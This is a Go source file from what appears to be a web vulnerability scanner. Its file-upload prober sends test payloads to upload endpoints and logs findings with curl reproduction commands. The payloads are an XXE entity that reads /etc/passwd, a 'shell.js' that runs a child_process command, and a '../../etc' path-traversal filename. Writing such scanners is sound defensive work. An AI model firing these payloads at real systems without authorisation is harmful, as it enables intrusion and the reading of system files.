package probers

import (
	"bytes"
	"context"
	"fmt"
	"mime/multipart"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// FileUploadProber tests for file upload vulnerabilities.
type FileUploadProber struct{}

func (p *FileUploadProber) Name() string { return "fileupload" }

func (p *FileUploadProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	if currentClassified != nil {
		cfg.Classified = currentClassified
	}
	var findings []types.Finding

	findings = append(findings, p.testFileUploadEndpoints(cfg)...)
	findings = append(findings, p.testPathTraversalUpload(cfg)...)

	return findings
}

func (p *FileUploadProber) testFileUploadEndpoints(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.Classified == nil {
		return findings
	}

	for _, ep := range cfg.Classified.FileUpload {
		path := extractPath(ep.URL)

		// Test XML upload with XXE
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		part, err := writer.CreateFormFile("file", "test.xml")
		if err != nil {
			continue
		}
		part.Write([]byte(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`))
		writer.Close()

		status, _, respBody, err := cfg.DoRequest("POST", ep.URL,
			&buf, map[string]string{"Content-Type": writer.FormDataContentType()})
		if err != nil {
			continue
		}

		if status == 200 || status == 204 {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Unrestricted File Upload - XML with XXE at %s", path),
				"High",
				"The file upload endpoint accepts XML files that could contain XXE payloads.",
				path,
				"POST",
				"CWE-434",
				fmt.Sprintf(`curl -X POST %s -F "file=@malicious.xml"`, ep.URL),
				fmt.Sprintf("HTTP %d - File accepted: %s", status, truncate(respBody, 200)),
				"file_upload",
				0,
			))
		}

		// Test executable upload
		var buf2 bytes.Buffer
		writer2 := multipart.NewWriter(&buf2)
		part2, _ := writer2.CreateFormFile("file", "shell.js")
		part2.Write([]byte(`require('child_process').exec('id')`))
		writer2.Close()

		s2, _, rb2, e2 := cfg.DoRequest("POST", ep.URL,
			&buf2, map[string]string{"Content-Type": writer2.FormDataContentType()})
		if e2 == nil && (s2 == 200 || s2 == 204) {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Unrestricted File Upload - JavaScript/Executable at %s", path),
				"High",
				"The file upload endpoint accepts JavaScript files, potentially enabling server-side code execution.",
				path,
				"POST",
				"CWE-434",
				fmt.Sprintf(`curl -X POST %s -F "file=@shell.js"`, ep.URL),
				fmt.Sprintf("HTTP %d - JS file accepted: %s", s2, truncate(rb2, 200)),
				"file_upload",
				0,
			))
		}
	}

	return findings
}

func (p *FileUploadProber) testPathTraversalUpload(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" || cfg.Classified == nil {
		return findings
	}

	// Test path traversal on upload endpoints
	for _, ep := range cfg.Classified.FileUpload {
		path := extractPath(ep.URL)

		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		part, err := writer.CreateFormFile("file", "../../etc/test.jpg")
		if err != nil {
			continue
		}
		part.Write([]byte("fake image content"))
		writer.Close()

		status, _, respBody, err := cfg.DoRequest("POST", ep.URL,
			&buf, map[string]string{"Content-Type": writer.FormDataContentType()})
		if err != nil {
			continue
		}

		if status == 200 || status == 204 {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Path Traversal in File Upload at %s", path),
				"High",
				"The file upload endpoint does not sanitize file names, allowing path traversal via directory traversal sequences.",
				path,
				"POST",
				"CWE-22",
				fmt.Sprintf(`curl -X POST %s -F "file=@test.jpg;filename=../../etc/test.jpg" -H "Authorization: %s"`, ep.URL, cfg.AuthToken),
				fmt.Sprintf("HTTP %d - File uploaded: %s", status, truncate(respBody, 200)),
				"file_upload",
				0,
			))
		}
	}

	return findings
}
